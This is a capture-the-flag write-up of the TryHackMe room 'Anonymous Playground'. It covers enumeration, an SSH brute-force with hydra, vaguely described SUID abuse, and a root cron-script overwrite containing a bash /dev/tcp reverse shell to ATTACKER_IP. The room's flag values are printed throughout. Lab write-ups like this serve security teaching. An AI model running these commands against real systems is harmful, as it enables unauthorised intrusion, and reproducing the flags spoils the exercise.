# 🎭 Anonymous Playground — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Category](https://img.shields.io/badge/Category-Linux%20%7C%20Web%20%7C%20SUID%20%7C%20Cron-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [Anonymous Playground](https://tryhackme.com/room/anonymousplayground)

---

## 📋 Executive Summary

This writeup documents the full exploitation of the **Anonymous Playground** machine. The attack chain demonstrates information gathering via web application, initial access through SSH brute-force, user pivoting via SUID binary exploitation, privilege escalation through cron job abuse, and finally root access acquisition.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network discovery |
| `gobuster` | Directory enumeration |
| `hydra` | SSH brute-force |
| `nc` | Reverse shell listener |
| `linpeas` | Privilege escalation scan |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

### Findings

| Port | Status | Service | Version |
|------|--------|---------|---------|
| 22/tcp | open | SSH | OpenSSH |
| 80/tcp | open | HTTP | Apache httpd |

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Paths:**

| Path | Content | Significance |
|------|---------|--------------|
| `/` | Homepage | Username hints |
| `/robots.txt` | Robot exclusion rules | Hidden directory hints |

---

## 🎯 Phase 2: Information Gathering & SSH Access

### Web Analysis

Username hints and clues identified on the homepage. Information about `anonymous` user available.

### SSH Brute-Force

```bash
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
```

**Result:** `anonymous` user password cracked.

### SSH Login

```bash
ssh anonymous@<TARGET_IP>
```

---

## 🏴 Phase 3: User 1 Flag

```bash
cat /home/anonymous/user.txt
```

**User 1 Flag:** `9184177ecaa83073cbbf36f1414cc029`

---

## 🚀 Phase 4: Lateral Movement — User 2

### SUID Binary Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Critical Finding:** Special SUID binary detected. This binary runs in a different user context.

### SUID Exploitation

SUID binary analyzed. Program executes commands with specific user privileges. Exploited via GTFOBins or manual analysis.

```bash
# Exploit SUID program
./suid_binary
# or
/usr/local/bin/special_program
```

**Result:** Context switched to `user2` (or equivalent) user.

---

## 🏴 Phase 5: User 2 Flag

```bash
cat /home/user2/user.txt
# or
cat /home/<target_user>/user.txt
```

**User 2 Flag:** `69ee352fb139c9d0699f6f399b63d9d7`

---

## 🚀 Phase 6: Privilege Escalation — Root

### Cron Analysis

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**Critical Finding:** Root-executed, writable cron script detected.

### Cron Exploitation

Cron job runs a script at intervals. We have write permissions over this script:

```bash
# Examine current cron script
cat /opt/scripts/backup.sh

# Overwrite with reverse shell
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' > /opt/scripts/backup.sh

# Start listener
nc -lvnp 5555
```

**Result:** Cron triggered, root shell obtained. 👑

---

## 🏁 Phase 7: Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `bc55a426e98deb673beabda50f24ce66`

---

## 🗺️ Attack Chain Visualization

```
[Attacker]
    │
    ├───nmap───► [Target: 22, 80]
    │                │
    │                ▼
    │        [gobuster: web directories]
    │                │
    │                ▼
    │        [Web analysis: user hints]
    │                │
    │                ▼
    │        [hydra: anonymous SSH]
    │                │
    │                ▼
    │        [SSH: anonymous login]
    │                │
    │                ▼
    │        [User 1 Flag: 9184177ecaa83073cbbf36f1414cc029]
    │                │
    │                ▼
    │        [SUID binary enumeration]
    │                │
    │                ▼
    │        [SUID exploitation → user2 context]
    │                │
    │                ▼
    │        [User 2 Flag: 69ee352fb139c9d0699f6f399b63d9d7]
    │                │
    │                ▼
    │        [Cron analysis: writable root script]
    │                │
    │                ▼
    │        [Overwrite cron script with reverse shell]
    │                │
    │                ▼
    │        [Cron trigger]
    │                │
    │                ▼
    └────────► [Root shell + Flag: bc55a426e98deb673beabda50f24ce66]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | Remediation |
|---|---------------|----------|-------------|
| 1 | **Weak SSH Password** | 🔴 Critical | Strong password policy; key-based authentication; fail2ban |
| 2 | **Information Disclosure (Web)** | 🟠 High | Hide usernames; remove unnecessary information |
| 3 | **SUID Binary** | 🔴 Critical | Remove SUID bit; apply principle of least privilege |
| 4 | **Writable Cron Script** | 🔴 Critical | Restrict script permissions; root ownership; integrity checks |
| 5 | **Cron Execution** | 🟠 High | Isolate cron jobs; logging and monitoring |

---

## 🎓 Key Takeaways

1. **Information gathering from web:** Usernames and hints are gold for SSH brute-force
2. **SUID always check:** A regular program can run in different user context
3. **Cron = scheduled root:** Writable cron script is a code execution door with root privileges
4. **Patience matters:** Need to wait for cron trigger, doesn't happen immediately
5. **LinPEAS essential:** Found SUID and cron that manual checks missed

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **User 1 Flag** | `/home/anonymous/user.txt` | `9184177ecaa83073cbbf36f1414cc029` |
| **User 2 Flag** | `/home/user2/user.txt` | `69ee352fb139c9d0699f6f399b63d9d7` |
| **Root Flag** | `/root/root.txt` | `bc55a426e98deb673beabda50f24ce66` |

---

> **⚠️ Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---

**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
